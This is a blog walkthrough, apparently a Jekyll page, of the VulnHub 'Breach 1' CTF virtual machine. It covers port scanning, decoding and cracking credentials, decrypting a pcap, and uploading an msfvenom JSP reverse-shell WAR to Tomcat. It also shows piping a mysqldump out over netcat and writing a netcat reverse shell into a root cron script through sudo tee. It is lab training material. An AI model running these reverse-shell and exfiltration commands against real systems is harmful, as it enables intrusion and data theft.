@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Breach 1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Breach 1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: Is a boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence." />
+<meta property="og:description" content="Description: Is a boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence." />
+<link rel="canonical" href="http://localhost:4000/breach1.html" />
+<meta property="og:url" content="http://localhost:4000/breach1.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/breach1.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-06T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/breach1.html" />
+<meta property="twitter:title" content="VulnHub - Breach 1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Breach 1","dateModified":"2021-09-06T00:00:00-05:00","datePublished":"2021-09-06T00:00:00-05:00","url":"http://localhost:4000/breach1.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/breach1.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: Is a boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Breach 1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>September 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> Is a boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence.</p>
+
+<p><strong>Author:</strong> mrb3n</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+
+<p>The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet, so I assigned an IP address to the vmnet1 interface.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ip addr add 192.168.110.142/24 dev vmnet1
+root@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 3 192.168.110.140  
+PING 192.168.110.140 <span class="o">(</span>192.168.110.140<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.705 ms
+64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.677 ms
+64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.698 ms
+
+<span class="nt">---</span> 192.168.110.140 ping statistics <span class="nt">---</span>
+3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2009ms
+rtt min/avg/max/mdev <span class="o">=</span> 0.677/0.693/0.705/0.011 ms
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>I did a port scan but it shows us that all ports are open, maybe an IDS/IPS is operating from behind.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-n</span> 192.168.110.140 <span class="nt">-oG</span> tcp-open-ports.txt
+...
+Scanning 192.168.110.140 <span class="o">[</span>65535 ports]
+Discovered open port 8888/tcp on 192.168.110.140
+Discovered open port 445/tcp on 192.168.110.140
+Discovered open port 111/tcp on 192.168.110.140
+Discovered open port 23/tcp on 192.168.110.140
+Discovered open port 25/tcp on 192.168.110.140
+Discovered open port 22/tcp on 192.168.110.140
+Discovered open port 199/tcp on 192.168.110.140
+Discovered open port 443/tcp on 192.168.110.140
+Discovered open port 110/tcp on 192.168.110.140
+Discovered open port 139/tcp on 192.168.110.140
+Discovered open port 587/tcp on 192.168.110.140
+Discovered open port 3306/tcp on 192.168.110.140
+Discovered open port 1720/tcp on 192.168.110.140
+Discovered open port 8080/tcp on 192.168.110.140
+...
+</code></pre></div></div>
+
+<p>So I decided to do a FIN port scan and was able to find that ports 80,4444 and 8443 were open.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-sF</span> <span class="nt">-p-</span> 192.168.110.140
+...
+PORT     STATE         SERVICE
+80/tcp   open|filtered http
+4444/tcp open|filtered krb524
+8443/tcp open|filtered https-alt
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>I proceeded with nmap to do the service detection and script scanning of open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,4444,8443 192.168.110.140 <span class="nt">-oN</span> service-enum.txt
+...
+PORT     STATE SERVICE        VERSION
+80/tcp   open  http           Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Welcome to Breach 1.0
+4444/tcp open  http           Johnson Metasys building management system http interface
+|_http-server-header: NAE01
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
+8443/tcp open  ssl/https-alt?
+| ssl-cert: Subject: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown
+| Issuer: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2016-05-20T17:51:07
+| Not valid after:  2016-08-18T17:51:07
+| MD5:   c472 e6b0 5f58 ce8b b47e 2d67 86a9 52a0
+|_SHA-1: d5d2 49c3 6993 cce5 39a9 de5c 91dc f126 a640 4653
+|_ssl-date: 2021-10-04T10:43:05+00:00; -5h00m01s from scanner time.
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>So I decided to interact the HTTP service, on the web page I can read that Initech has been compromised and cyber consultants have intervened to contain the breach.</p>
+
+<p><img src="/assets/images/breach1/screenshot-1.png" alt="" /></p>
+
+<p>In the page source I found base64 encoded characters, I decoded that text string and discovered a potential login credential.</p>
+
+<p><img src="/assets/images/breach1/screenshot-2.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.110.140/ | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'&lt;!.*-&gt;$'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"-"</span> <span class="s1">'{print $7}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' '</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>pgibbons:damnitfeel<span class="nv">$goodtobeagang$ta</span>
+</code></pre></div></div>
+
+<p>If we noticed the initech.html link on the source page, I accessed it and this redirected me to a new page.</p>
+
+<p><img src="/assets/images/breach1/screenshot-3.png" alt="" /></p>
+
+<p>I clicked on <strong>Employe portal</strong> and it redirected me to impresscms, I logged in with the credentials found previously.</p>
+
+<p><img src="/assets/images/breach1/screenshot-4.png" alt="" />
+<img src="/assets/images/breach1/screenshot-5.png" alt="" /></p>
+
+<p>In the Inbox I saw some messages, in one of them I found a keystore file, and I downloaded it.</p>
+
+<p><img src="/assets/images/breach1/screenshot-6.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.110.140/.keystore <span class="nt">-O</span> keystore
+
+root@kali:~<span class="nv">$ </span>file keystore 
+keystore: Java KeyStore
+</code></pre></div></div>
+
+<p>Then I verified that’s a Java KeyStore file, a JKS is an encrypted security file used to store a set of cryptographic keys or certificates in the binary format and it requires a password to be opened.</p>
+
+<p>So I converted the JKS file into a format that john could undertand and then cracked it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/usr/share/john/keystore2john.py keystore <span class="o">&gt;</span> <span class="nb">hash
+</span>root@kali:~<span class="nv">$ </span>john <span class="nb">hash</span>
+...
+tomcat           <span class="o">(</span>keystore<span class="o">)</span>
+</code></pre></div></div>
+
+<p>After having no idea what to do with this file I decided to go back to researching the web page, in the content option I clicked on <strong>SSL implementation test capture</strong> link. I discovered a pcap file that’s located in the document root and also speaks that alias, storepassword and keypassword are set all to ‘tomcat’, a hint to extract the JKS file.</p>
+
+<p><img src="/assets/images/breach1/screenshot-7.png" alt="" />
+<img src="/assets/images/breach1/screenshot-8.png" alt="" /></p>
+
+<p>I downloaded the pcap file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget 192.168.110.140/impresscms/_SSL_test_phase1.pcap
+</code></pre></div></div>
+
+<p>Then I extract the private key with keytool as shown in the following instruction, for more information you can click <a href="https://rajind.medium.com/extracting-private-key-from-java-keystore-jks-13dc5021173f">here</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/test<span class="nv">$ </span>keytool <span class="nt">-importkeystore</span> <span class="nt">-srckeystore</span> keystore <span class="nt">-srcstorepass</span> tomcat <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">-srckeypass</span> tomcat <span class="nt">-srcalias</span> tomcat <span class="nt">-destalias</span> tomcat <span class="nt">-destkeystore</span> identity.p12 <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">-deststoretype</span> PKCS12 <span class="nt">-deststorepass</span> tomcat <span class="nt">-destkeypass</span> tomcat
+Importing keystore keystore to identity.p12...
+</code></pre></div></div>
+
+<p>Analyzing the pcap file, I saw that the trafic is encrypted, to try reading this file we have to export our previously extracted file, to do this click on <strong>Edit-&gt;Preferences-&gt;Protocols-&gt;TLS</strong>, then press the <strong>Edit</strong> button in <strong>RSA Keys List</strong>, then add the specifications as shown in the following image.</p>
+
+<p><img src="/assets/images/breach1/screenshot-9.png" alt="" /></p>
+
+<p>Now the traffic is readable, so right click on a packet and <strong>Follow HTTP Stream</strong>, in the analysis I found the tomcat credentials for the service running on port 8443.</p>
+
+<p><img src="/assets/images/breach1/screenshot-10.png" alt="" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo </span>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | <span class="nb">base64</span> <span class="nt">-d</span> <span class="p">;</span> <span class="nb">echo
+</span>tomcat:Tt<span class="se">\5</span>D8F<span class="o">(</span><span class="c">#!*u=G)4m7zB</span>
+</code></pre></div></div>
+
+<p>Apart of this I could see that a webshell was uploaded to the server, but this currently doesn’t exist.</p>
+
+<p><strong>Apache tomcat port 8443</strong></p>
+
+<p>How we saw in the traffic, exist communication with the port 8443, but directly this web service doesn’t load, so I used burpsuite to avoid problems with the certificate, then this asks us for the credentials to log in, so I used the tomcat credentials.</p>
+
+<p><img src="/assets/images/breach1/screenshot-11.png" alt="" />
+<img src="/assets/images/breach1/screenshot-12.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="apache-tomcat">Apache Tomcat</h3>
+
+<p>Then I generated a war payload to upload it to the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.110.142 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="o">&gt;</span> z.war
+</code></pre></div></div>
+
+<p><img src="/assets/images/breach1/screenshot-13.png" alt="" />
+<img src="/assets/images/breach1/screenshot-14.png" alt="" /></p>
+
+<p>Before to execute our payload we need to start a netcat listener, and then we run the payload, and we have a reverse shell, the initial shell is limited so I upgraded to a full TTY shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.110.142] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140] 36846
+script <span class="nt">-qc</span> /bin/bash /dev/null
+tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-vlnp</span> 443
+root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span> 
+<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
+
+tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+</code></pre></div></div>
+
+<p>Then I listed the system users that use a shell bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'sh$'</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
+blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
+</code></pre></div></div>
+
+<p>I did a backup of mysql database, and then I tranferred it to my local machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>mysqldump <span class="nt">-u</span> root <span class="nt">--all-databases</span> <span class="o">&gt;</span> /tmp/mysqldump.sql
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4444 <span class="o">&gt;</span> mysqldump.sql
+tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>nc 192.168.110.142 4444 &lt; /tmp/mysqldump.sql
+</code></pre></div></div>
+
+<p>I filtered by the user milton in the buckup file and found a MD5 hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep </span>milton mysqldump.sql 
+INSERT INTO <span class="sb">`</span>user<span class="sb">`</span> VALUES <span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
+<span class="o">(</span><span class="s1">''</span>,<span class="s1">'milton'</span>,<span class="s1">'6450d89bd3aff1d893b85d3ad65d2ec2'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,NULL<span class="o">)</span>,
+<span class="o">(</span><span class="s1">'127.0.0.1'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
+<span class="o">(</span><span class="s1">'::1'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
+<span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'debian-sys-maint'</span>,<span class="s1">'*A9523939F1B2F3E72A4306C34F225ACF09590878'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,NULL<span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Then I discovered the password for this hash on <a href="hshes.com">hashes.com</a>.</p>
+
+<p><img src="/assets/images/breach1/screenshot-15.png" alt="" /></p>
+
+<p>I switched to the user milton and I decided enumerate for writable files and found a script with permissions for all users in the /etc/init.d/ directory, so to scale to root we would just write to the portly.sh file a netcat reverse shell, then we would reboot the machine, start a netcat listener and have a root shell, but this doesn’t seem realistic to me, so I looked for another method.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>su - milton
+su - milton
+Password: thelaststraw
+milton@Breach:~<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null
+...
+/etc/init.d/portly.sh
+...
+milton@Breach:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/init.d/portly.sh
+<span class="nt">-rwxrwxrwx</span> 1 root root 231 Jun  5  2016 /etc/init.d/portly.sh
+</code></pre></div></div>
+
+<p>After of couple of hours researching it occurs to me analyze the metadata of the images that I had overloooked.</p>
+
+<p><img src="/assets/images/breach1/screenshot-16.png" alt="" /></p>
+
+<p>I downloaded the images and analyzed them with exiftool, in the bill.png image I found a comment called coffeestains.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">mkdir </span>images
+root@kali:~<span class="nv">$ </span>wget <span class="nt">-nd</span> <span class="nt">-r</span> <span class="nt">--no-parent</span> <span class="nt">-A</span> “png,jpg,gif”  http://192.168.110.140/images/ <span class="nt">-P</span> images/
+
+root@kali:~<span class="nv">$ </span>exiftool images/<span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-Ei</span> <span class="s1">'file name|comment'</span>
+File Name                       : bill.png
+Comment                         : coffeestains
+File Name                       : cake.jpg
+File Name                       : initech.jpg
+File Name                       : milton_beach.jpg
+File Name                       : swingline.jpg
+File Name                       : troll.gif
+</code></pre></div></div>
+
+<p>I switched to the user blumbergh and listed sudo permissions, this user can execute the tidyup.sh script as sudo with the tee command, the script delete the files into the webapps directory, a cronjob is in charge of executing this task every certain period of time.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@Breach:~<span class="nv">$ </span>su - blumbergh
+Password: 
+blumbergh@Breach:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>
+blumbergh@Breach:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>blumbergh on Breach:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User blumbergh may run the following commands on Breach:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
+blumbergh@Breach:~<span class="nv">$ </span><span class="nb">cat</span> /usr/share/cleanup/tidyup.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="c">#Hacker Evasion Script </span>
+<span class="c">#Initech Cyber Consulting, LLC</span>
+<span class="c">#Peter Gibbons and Michael Bolton - 2016</span>
+<span class="c">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>
+
+<span class="nb">cd</span> /var/lib/tomcat6/webapps <span class="o">&amp;&amp;</span> find swingline <span class="nt">-mindepth</span> 1 <span class="nt">-maxdepth</span> 10 | xargs <span class="nb">rm</span> <span class="nt">-rf</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>I passed as input a netcat reverse shell to the tee command which will write it in the tidyup.sh script, and we see the script was overwrited with the reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@Breach:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.110.142 4444 -c /bin/bash'</span> | <span class="nb">sudo</span> /usr/bin/tee /usr/share/cleanup/tidyup.sh 
+nc 192.168.110.142 4444 <span class="nt">-c</span> /bin/bash
+blumbergh@Breach:~<span class="nv">$ </span><span class="nb">cat</span> <span class="o">!</span><span class="err">$</span>
+nc 192.168.110.142 4444 <span class="nt">-c</span> /bin/bash
+</code></pre></div></div>
+
+<p>Then start a netcat listener and a few minutes we get a root reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>192.168.110.142] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140] 36978
+<span class="nb">echo</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span> <span class="o">&gt;</span> /tmp/shell.py
+python /tmp/shell.py
+root@Breach:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@Breach:~# <span class="nb">ls</span> <span class="nt">-la</span>
+total 60
+drwx------  4 root root  4096 Jun 12  2016 <span class="nb">.</span>
+drwxr-xr-x 22 root root  4096 Jun  4  2016 ..
+<span class="nt">-rw-------</span>  1 root root   115 Jun 12  2016 .bash_history
+<span class="nt">-rw-r--r--</span>  1 root root  3106 Feb 19  2014 .bashrc
+drwx------  2 root root  4096 Jun  6  2016 .cache
+<span class="nt">-rw-r--r--</span>  1 root root   840 Jun 11  2016 .flag.txt
+<span class="nt">-rw-r--r--</span>  1 root root 23792 Jun  4  2016 flair.jpg
+<span class="nt">-rw-r--r--</span>  1 root root   140 Feb 19  2014 .profile
